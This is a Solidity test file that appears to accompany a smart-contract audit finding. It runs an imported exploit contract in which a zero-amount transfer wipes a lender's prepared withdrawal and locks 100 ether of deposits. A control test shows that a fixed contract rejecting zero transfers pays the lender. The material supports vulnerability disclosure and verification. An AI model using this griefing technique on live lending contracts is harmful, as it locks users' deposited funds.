// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {ERC20, Exploit, LenderCommitmentGroupSharesFixed} from "./44213-h-1-lender-group-members-can-be-prevented-from-burning-their.sol";

contract Finding44213Test is Test {
    function test_zero_transfer_locks_the_prepared_withdrawal() public {
        Exploit e = new Exploit();
        e.run();
        address victim = e.victim();
        assertEq(e.shares().poolSharesPreparedToWithdrawForLender(victim), 0, "preparation cleared");
        assertEq(e.underlying().balanceOf(address(e.shares())), 100 ether, "100 underlying stays locked");
        assertEq(e.underlying().balanceOf(victim), 0, "victim was not paid");
        assertEq(e.shares().balanceOf(victim), 100 ether, "share balance unchanged");
    }

    function test_control_skipping_zero_amount_lets_the_burn_pay() public {
        ERC20 underlying = new ERC20();
        address victim = address(0xBEEF);
        LenderCommitmentGroupSharesFixed fixedShares = new LenderCommitmentGroupSharesFixed(underlying, victim);
        underlying.mint(address(fixedShares), 100 ether);
        vm.expectRevert(bytes("zero amount"));
        fixedShares.transferFrom(victim, victim, 0);
        vm.warp(30 days);
        fixedShares.burn(victim, 100 ether);
        assertEq(underlying.balanceOf(victim), 100 ether, "victim is paid");
        assertEq(underlying.balanceOf(address(fixedShares)), 0, "group no longer holds the deposit");
    }
}
